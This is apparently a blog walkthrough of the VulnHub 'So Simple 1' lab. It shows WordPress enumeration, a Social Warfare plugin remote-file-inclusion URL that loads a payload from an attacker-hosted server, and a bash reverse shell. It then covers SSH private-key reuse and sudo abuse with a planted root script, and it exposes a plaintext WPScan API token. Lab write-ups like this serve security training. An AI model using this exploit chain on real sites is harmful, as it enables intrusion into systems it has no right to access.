<!-- wp:paragraph -->
<p><a href="https://www.vulnhub.com/entry/so-simple-1,515/" target="_blank" rel="noreferrer noopener">https://www.vulnhub.com/entry/so-simple-1,515/</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center","backgroundColor":"vivid-purple","fontSize":"small"} -->
<p class="has-text-align-center has-vivid-purple-background-color has-background has-small-font-size">Review</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>Enumeration will lead to a wordpress site</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Use WPscan to enumerate and find a vulnearbility</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Exploit the vulnerability by sending a bash reverse shell</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Once user is gained avoid the rabbitholes and find a private rsa key</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>In the new user check for sudo permissions to gain access to another user</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The second user will be able to run a script as root</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Recreate the exact script with a bash shell to gain root access</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center","backgroundColor":"luminous-vivid-amber","fontSize":"small"} -->
<p class="has-text-align-center has-luminous-vivid-amber-background-color has-background has-small-font-size"><strong>Enumeration</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Run nmap scan to find for open ports.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5544,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-628.png?w=695" alt="" class="wp-image-5544"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5543,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-627.png?w=1024" alt="" class="wp-image-5543"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Port 80</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5547,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-629.png?w=1024" alt="" class="wp-image-5547"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Run a gobuster scan to find for hidden directories. </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5548,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-630.png?w=1024" alt="" class="wp-image-5548"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>/wordpress</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5549,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-631.png?w=1024" alt="" class="wp-image-5549"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Since it is a wordpress site let's do Wpscan. Using the api-token option will result in a better scan.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>wpscan --url http://192.168.18.14/wordpress -e --api-token 5PjcfWLMe7p0vz4gUphxPQkozlZN3TdJP0WXCeFkxbs</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5551,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-632.png?w=1024" alt="" class="wp-image-5551"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Found a vulnerable plugin call social-warfare.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5553,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-633.png?w=1024" alt="" class="wp-image-5553"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Also found two users and one password. However the max user as limited controls as wordpress admin.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5554,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-634.png?w=1014" alt="" class="wp-image-5554"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Search online for the vulnerability and we are able to create a payload and load it in the url.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5556,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-635.png?w=1024" alt="" class="wp-image-5556"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Create a payload , host it on a python server and execute the URL. (May need to edit the full path of the URL)</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>http:&#47;&#47;192.168.18.14/wordpress/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=http://192.168.18.8:81/payload.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5558,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-636.png?w=1024" alt="" class="wp-image-5558"/><figcaption class="wp-element-caption">Payload works.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Now let's create a bash script in the payload script. For the bash script add the bash -c command with the payload.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5560,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-637.png?w=922" alt="" class="wp-image-5560"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Start up a netcat listener. </p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center","backgroundColor":"vivid-cyan-blue","fontSize":"small"} -->
<p class="has-text-align-center has-vivid-cyan-blue-background-color has-background has-small-font-size"><strong>Foothold</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>User access gained.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5561,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-638.png?w=822" alt="" class="wp-image-5561"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Found a couple of rabbitholes in this user.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5563,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-639.png?w=533" alt="" class="wp-image-5563"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5564,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-640.png?w=756" alt="" class="wp-image-5564"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5566,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-641.png?w=248" alt="" class="wp-image-5566"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5567,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-642.png?w=636" alt="" class="wp-image-5567"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5569,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-643.png?w=604" alt="" class="wp-image-5569"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Go to max user and look into .ssh folder. There will be a private key,</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5570,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-644.png?w=784" alt="" class="wp-image-5570"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Use the private key to ssh into the max user.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5572,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-645.png?w=976" alt="" class="wp-image-5572"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Found the first flag.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5573,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-646.png?w=384" alt="" class="wp-image-5573"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Check sudo permissions and we are able to run service to get steven as a user.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5574,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-647.png?w=1024" alt="" class="wp-image-5574"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Once steven is gained check the sudo permissions. We are able to run as root in a server-health.sh script.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5576,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-648.png?w=1024" alt="" class="wp-image-5576"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center","backgroundColor":"black","textColor":"white","fontSize":"small"} -->
<p class="has-text-align-center has-white-color has-black-background-color has-text-color has-background has-small-font-size"><strong>Privilege escalation</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>However this file in not available. We create a folder named tools in the opt directory and create a bash script called server-health.sh. Then insert a bash command in the script and execute the file as root. </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5577,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-649.png?w=662" alt="" class="wp-image-5577"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Root accessed is gained. Find the second flag in steven's home directory and the final flag in the root folder.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5579,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-650.png?w=467" alt="" class="wp-image-5579"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5580,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-651.png?w=1024" alt="" class="wp-image-5580"/></figure>
<!-- /wp:image -->
